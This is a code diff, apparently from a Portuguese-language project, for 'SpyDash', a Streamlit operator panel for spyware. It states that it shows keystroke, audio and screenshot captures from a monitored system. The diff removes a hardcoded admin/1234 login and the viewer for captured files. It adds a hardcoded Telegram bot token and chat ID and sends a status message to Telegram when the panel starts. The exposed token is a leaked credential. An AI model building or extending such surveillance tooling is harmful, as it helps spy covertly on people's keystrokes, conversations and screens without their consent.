@@ -1,47 +1,24 @@
 import streamlit as st
 import os
+import requests
+from dotenv import load_dotenv
 
-# Página com login
-def login():
-    st.title("🔐 SpyDash - Login")
-    usuario = st.text_input("Usuário")
-    senha = st.text_input("Senha", type="password")
-    if st.button("Entrar"):
-        if usuario == "admin" and senha == "1234":
-            st.session_state.logado = True
-        else:
-            st.error("Credenciais inválidas!")
+# Configuração do Telegram
+BOT_TOKEN = "8169475379:AAEM3RqcruOrbFd0dBKUMzwDZ5gRPl-FqxU"
+CHAT_ID = "5672315001"
 
-# Página principal do painel
-def painel():
-    st.set_page_config(page_title="SpyDash", layout="wide")
-    st.title("🕵️ SpyDash - Painel de Monitoramento")
-    st.markdown("### Capturas em tempo real")
-    st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")
+# Função para enviar mensagens
+def enviar_telegram(mensagem):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": mensagem}
+    requests.post(url, data=data)
 
-    pasta = "provas"
-    if not os.path.exists(pasta):
-        st.info("Nenhuma captura foi registrada ainda.")
-        return
+# Painel Streamlit
+st.set_page_config(page_title="SpyDash", layout="wide")
+st.title("🕵️ SpyDash - Painel de Monitoramento")
 
-    arquivos = sorted(os.listdir(pasta), reverse=True)
-    for arq in arquivos:
-        caminho = os.path.join(pasta, arq)
-        st.markdown(f"#### 📁 {arq}")
-        if arq.endswith(".txt"):
-            with open(caminho, "r", encoding="utf-8") as f:
-                st.code(f.read(), language="text")
-        elif arq.endswith(".wav"):
-            st.audio(caminho)
-        elif arq.endswith((".png", ".jpg", ".jpeg")):
-            st.image(caminho)
-        st.markdown("---")
+st.markdown("### Capturas em tempo real")
+st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")
 
-# Controle de sessão
-if "logado" not in st.session_state:
-    st.session_state.logado = False
-
-if st.session_state.logado:
-    painel()
-else:
-    login()
+# Envio de mensagem de status
+enviar_telegram("✅ SpyDash foi iniciado e está ao vivo no painel de monitoramento.")
